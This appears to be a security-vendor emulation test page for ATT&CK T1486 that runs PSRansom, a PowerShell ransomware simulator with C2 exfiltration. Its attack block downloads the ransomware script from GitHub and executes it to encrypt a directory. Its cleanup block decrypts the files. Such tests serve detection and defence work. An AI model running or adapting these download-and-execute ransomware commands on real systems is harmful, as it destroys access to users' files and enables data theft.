# PSRansom - Tehtris Test: Running PSRansom
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1486)
<blockquote>PSRansom is a PowerShell Ransomware Simulator with C2 Server capabilities. This tool helps you simulate encryption process of a generic ransomware in any system on any system with PowerShell installed on it. Thanks to the integrated C2 server, you can exfiltrate files and receive client information via HTTP.

All communication between the two elements is encrypted or encoded so as to be undetected by traffic inspection mechanisms, although at no time is HTTPS used at any time.</blockquote>

## Tehtris Tests

- [Tehtris Test - Running PSRansom](#tehtris-test---PSRansom)

<br/>

## Tehtris Test - Running PSRansom
Methods to simulate a ransomware on a single computer.

when sucessfully executed, the test encrypts files on the computer and drop a ransom note.

**Supported Platforms:** Windows


**auto_generated_guid:** f92a380f-ced9-491f-b338-95a101418ce2


#### Attack Commands: Run with `powershell`! 


```powershell
$file_url = "https://raw.githubusercontent.com/HakkYahud/PSRansom/main/PSRansom.ps1"
$file_path = "C:\Users\Public\PSRansom.ps1"
$victim_directory = "C:\Users\I241001\AppData\Local\security.df6"
(New-Object System.Net.WebClient).DownloadFile($file_url, $file_path)
powershell $file_path -e $victim_directory -k "TehtrisKey007!"
```

#### Cleanup Commands:
```powershell
$psrk = Get-Content -Path $env:public\recoverykey.txt
Write-Host [+] Recovery Key: $psrk
powershell $file_path -d $victim_directory -k $psrk
Remove-Item $file_path
Remove-Item $env:public\recoverykey.txt
```

<br/>
<br/>